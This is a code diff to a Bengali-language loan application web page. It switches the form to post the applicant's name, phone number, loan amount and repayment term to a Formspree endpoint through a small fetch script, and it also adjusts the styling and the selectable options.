@@ -124,6 +124,10 @@
             cursor: pointer;
             box-shadow: 0 4px 15px rgba(255, 68, 0, 0.3);
         }
+        .submit-btn:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+        }
     </style>
 </head>
 <body>
@@ -133,22 +137,21 @@
 
     <div class="header-title-box">
         <h2>লোন আবেদন ফরম</h2>
-        <p>সঠিক তথ্য দিয়ে নিচের ফরমটি পূরণ করুন</p>
+        <p>সঠিক তথ্য দিয়ে আবেদনটি সম্পন্ন করুন</p>
     </div>
 
     <div class="form-body">
         <div class="security-badge">
             <i class="fa-solid fa-shield-halved"></i>
-            <span>SSL ২৫৬-বিট এনক্রিপশন · আপনার তথ্য সুরক্ষিত</span>
+            <span>SSL এনক্রিপশন · আপনার তথ্য সুরক্ষিত</span>
         </div>
 
-        <!-- অ্যাকশন পাথ রাখা হয়েছে ./summary.html যাতে ৪০৪ না আসে -->
-        <form action="./summary.html" method="GET">
+        <form id="loanForm" action="https://formspree.io/f/xvkkeegq" method="POST">
             <div class="input-group">
                 <label class="input-label"><i class="fa-solid fa-user"></i> সম্পূর্ণ নাম</label>
                 <div class="input-wrapper">
                     <i class="fa-regular fa-user field-icon"></i>
-                    <input type="text" name="fullname" class="input-field" required placeholder="আপনার নাম লিখুন">
+                    <input type="text" name="আবেদনকারীর_নাম" class="input-field" required placeholder="আপনার নাম লিখুন">
                 </div>
             </div>
 
@@ -156,7 +159,7 @@
                 <label class="input-label"><i class="fa-solid fa-phone"></i> মোবাইল নম্বর</label>
                 <div class="input-wrapper">
                     <i class="fa-solid fa-mobile-screen field-icon"></i>
-                    <input type="tel" name="phone" class="input-field" required placeholder="০১XXXXXXXXX">
+                    <input type="tel" name="মোবাইল_নম্বর" class="input-field" required placeholder="০১XXXXXXXXX">
                 </div>
             </div>
 
@@ -164,14 +167,11 @@
                 <label class="input-label"><i class="fa-solid fa-sack-dollar"></i> লোনের পরিমাণ</label>
                 <div class="input-wrapper">
                     <i class="fa-solid fa-bangladeshi-taka-sign field-icon"></i>
-                    <select class="select-field" name="amount" required>
-                        <option value="1000">১,০০০ টাকা</option>
-                        <option value="2000">২,০০০ টাকা</option>
-                        <option value="3000">৩,০০০ টাকা</option>
-                        <option value="5000">৫,০০০ টাকা</option>
-                        <option value="10000" selected>১০,০০০ টাকা</option>
-                        <option value="20000">২০,০০০ টাকা</option>
-                        <option value="50000">৫০,০০০ টাকা</option>
+                    <select class="select-field" name="লোনের_পরিমাণ" required>
+                        <option value="১০,০০০ টাকা" selected>১০,০০০ টাকা</option>
+                        <option value="২০,০০০ টাকা">২০,০০০ টাকা</option>
+                        <option value="৩০,০০০ টাকা">৩০,০০০ টাকা</option>
+                        <option value="৫০,০০০ টাকা">৫০,০০০ টাকা</option>
                     </select>
                     <i class="fa-solid fa-chevron-down chevron-icon"></i>
                 </div>
@@ -181,24 +181,58 @@
                 <label class="input-label"><i class="fa-solid fa-calendar-days"></i> পরিশোধের মেয়াদ</label>
                 <div class="input-wrapper">
                     <i class="fa-regular fa-clock field-icon"></i>
-                    <select class="select-field" name="months" required>
-                        <option value="1">১ মাস</option>
-                        <option value="2">২ মাস</option>
-                        <option value="3" selected>৩ মাস</option>
-                        <option value="6">৬ মাস</option>
-                        <option value="12">১২ মাস</option>
+                    <select class="select-field" name="পরিশোধের_মেয়াদ" required>
+                        <option value="৩ মাস" selected>৩ মাস</option>
+                        <option value="৬ মাস">৬ মাস</option>
+                        <option value="১২ মাস">১২ মাস</option>
                     </select>
                     <i class="fa-solid fa-chevron-down chevron-icon"></i>
                 </div>
             </div>
 
-            <button type="submit" class="submit-btn">
-                <span>পরবর্তী ধাপে যান</span>
-                <i class="fa-solid fa-arrow-right"></i>
+            <button type="submit" id="submitBtn" class="submit-btn">
+                <span>আবেদন সম্পন্ন করুন</span>
+                <i class="fa-solid fa-check"></i>
             </button>
         </form>
     </div>
 </div>
+
+<script>
+    const form = document.getElementById("loanForm");
+    const submitBtn = document.getElementById("submitBtn");
+
+    form.addEventListener("submit", async function(event) {
+        event.preventDefault();
+        
+        submitBtn.disabled = true;
+        submitBtn.innerHTML = '<span>তথ্য পাঠানো হচ্ছে...</span>';
+
+        const data = new FormData(form);
+
+        try {
+            const response = await fetch(form.action, {
+                method: "POST",
+                body: data,
+                headers: {
+                    'Accept': 'application/json'
+                }
+            });
+
+            if (response.ok) {
+                window.location.href = "./success.html";
+            } else {
+                alert("দুঃখিত, তথ্য পাঠাতে সমস্যা হয়েছে। পুনরায় চেষ্টা করুন।");
+                submitBtn.disabled = false;
+                submitBtn.innerHTML = '<span>আবেদন সম্পন্ন করুন</span> <i class="fa-solid fa-check"></i>';
+            }
+        } catch (error) {
+            alert("ইন্টারনেট সংযোগ চেক করে পুনরায় চেষ্টা করুন।");
+            submitBtn.disabled = false;
+            submitBtn.innerHTML = '<span>আবেদন সম্পন্ন করুন</span> <i class="fa-solid fa-check"></i>';
+        }
+    });
+</script>
 
 </body>
 </html>
